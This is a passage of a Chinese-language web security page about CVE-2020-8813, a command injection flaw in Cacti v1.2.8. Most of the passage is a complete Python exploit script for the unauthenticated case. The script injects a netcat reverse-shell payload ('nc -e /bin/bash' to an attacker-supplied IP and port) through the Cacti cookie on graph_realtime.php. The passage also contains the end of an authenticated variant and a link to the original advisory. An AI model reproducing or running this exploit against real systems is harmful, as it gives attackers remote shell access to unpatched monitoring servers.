&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[-]Cannot Login!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[-] Unable to retrieve CSRF token!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">运行漏洞利用代码后，我们将获得以下内容：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Cacti/%ef%bc%88CVE-2020-8813%ef%bc%89Cacti%20v1.2.8%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image10.png" width="560" height="352" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="未经身份验证的利用"><span class="csD6CA00D2">未经身份验证的利用</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">如果</span><span class="cs8926E06">Cacti</span><span class="cs9C1B1871">启用了</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">来宾实时图</span><span class="cs8926E06">&rdquo;</span><span class="cs9C1B1871">特权，则无需身份验证即可利用此漏洞，因此在这种情况下，不需要身份验证部分，您可以使用以下代码来利用此漏洞：</span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 03/02/2020</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Exploit Author: Askar (@mohammadaskar2)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># CVE: CVE-2020-8813</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Vendor Homepage: https://cacti.net/</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Version: v1.2.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Tested on: CentOS 7.3 / PHP 7.1.33</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import warnings</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from bs4 import BeautifulSoup</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from urllib.parse import quote</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">warnings.filterwarnings(&quot;ignore&quot;, category=UserWarning, module=&#39;bs4&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if len(sys.argv) != 4:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print(&quot;[~] Usage : ./Cacti-exploit.py url ip port&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">url = sys.argv[1]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">ip = sys.argv[2]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">port = sys.argv[3]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def send_exploit(url):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = &quot;;nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s&quot; % (ip, port)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cookies = {&#39;Cacti&#39;: quote(payload)}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;path = url+&quot;/graph_realtime.php?action=init&quot;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;req = requests.get(path)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if req.status_code == 200 and &quot;poller_realtime.php&quot; in req.text:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] File Found and Guest is enabled!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Sending malicous request, check your nc ;)&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requests.get(path, cookies=cookies)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;[+] Error while requesting the file!&quot;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">send_exploit(url)</span></p><p class="cs40DD2BC9"><span class="cs8926E06">image</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">如我们所见，如果启用了</span><span class="cs8926E06">&ldquo; Gest Realtime Graphs&rdquo;</span><span class="cs9C1B1871">特权，我们也可以毫无问题地利用它，因此最好检查</span><span class="cs8926E06">&ldquo; graph_realtime.php&rdquo;</span><span class="cs9C1B1871">文件是否具有此访问特权。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/</span></p></body>
</html>
